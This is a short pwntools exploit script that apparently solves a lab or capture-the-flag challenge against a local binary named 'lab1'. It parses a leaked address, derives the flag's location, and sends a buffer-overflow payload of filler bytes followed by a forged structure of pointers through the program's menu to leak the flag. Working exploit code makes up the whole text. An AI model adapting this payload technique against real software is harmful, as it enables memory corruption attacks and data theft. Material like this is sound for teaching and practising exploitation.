from pwn import *
import sys
import time

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

script = """
c
"""

if len(sys.argv) > 1:
    p = gdb.debug("./lab1", gdbscript=script, level="debug")
else:
    p = process("./lab1")

p.recvuntil("Here is a gift for you: 0x")
note_buf = int(p.recvline().strip(),16)
flag = note_buf-0x1010
log.info(f"note_buf: {hex(note_buf)}")

pl = flat(
    "A"*0x210,
    0x0800, 0,
    flag, 0,
    flag, flag+0x50,
    0, 0,
    0, 0,
    0, 0,
    0, 0,
    1
)

p.sendlineafter("> ", "1")
p.sendlineafter("> ", "2")
p.sendlineafter("data> ", pl)
p.sendlineafter("> ", "3")

p.interactive()
